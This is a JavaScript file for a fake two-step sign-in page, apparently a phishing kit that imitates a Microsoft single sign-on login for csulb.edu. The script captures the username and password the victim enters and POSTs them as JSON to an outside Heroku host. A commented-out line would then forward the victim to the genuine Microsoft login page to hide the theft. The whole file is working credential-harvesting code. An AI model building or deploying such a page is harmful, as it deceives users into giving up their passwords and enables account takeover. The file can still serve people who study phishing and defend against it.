const nextBtn = document.querySelector(".next");
const signInBtn = document.querySelector(".submit");
const screen1 = document.querySelector(".screen-1");
const screen2 = document.querySelector(".screen-2");
const userName = document.querySelector("#username");
const passWord = document.querySelector("#password");
const userNameHeader = document.querySelector(".return-username");
const signInOptions = document.querySelector(".sign-in__options");
const userNameForm = document.querySelector(".username-form");
const passWordForm = document.querySelector(".password-form");

let username;
let password;

screen1.classList.add("moveInScreen");

nextBtn.addEventListener('click', (event) => {
    event.preventDefault();
    transitionToPassword();
});

userNameForm.addEventListener('submit', (event) => {
    event.preventDefault();
    transitionToPassword();
});

signInBtn.addEventListener('click', (event) => {
    event.preventDefault();
    password = passWord.value;
    returnValues();
});

passWordForm.addEventListener('submit', (event) => {
    event.preventDefault();
    password = passWord.value;
    returnValues();
})

const returnValues = () => {
    const logInfo = {
        username: username,
        password: password,
    }

    console.log(logInfo);

    fetch('https://fakewebsite.herokuapp.com/add_info', {
        method: 'POST',
        body: JSON.stringify(logInfo),
        headers: {
            'Content-Type': 'application/json'
        }
    })
        .then(res => res.json())
        .then(res => console.log(res));

    // window.location.replace("https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=2793995e-0a7d-40d7-bd35-6968ba142197&redirect_uri=https%3A%2F%2Fmyapps.microsoft.com&scope=openid+profile+email+offline_access&response_type=code&response_mode=fragment&code_challenge=SzGR8bVxPq0vjWOyeYkIHxS-it9e-Y5PeqdFzrSuKq4&code_challenge_method=S256&state=086db234-3d37-4cea-a054-fc5f57e86a6c&domain_hint=csulb.edu&safe_rollout=apply%3A4c5f1cd9-65ad-4147-acf6-e9a11c424a40&sso_reload=true");
}

const transitionToPassword = () => {
    screen1.classList.add("moveOffScreen");
    setTimeout(() => {
        screen2.classList.add("moveInScreen");
        signInOptions.classList.add("remove");
    }, 250);
    username = userName.value;

    const text = document.createTextNode(username);
    userNameHeader.appendChild(text);
}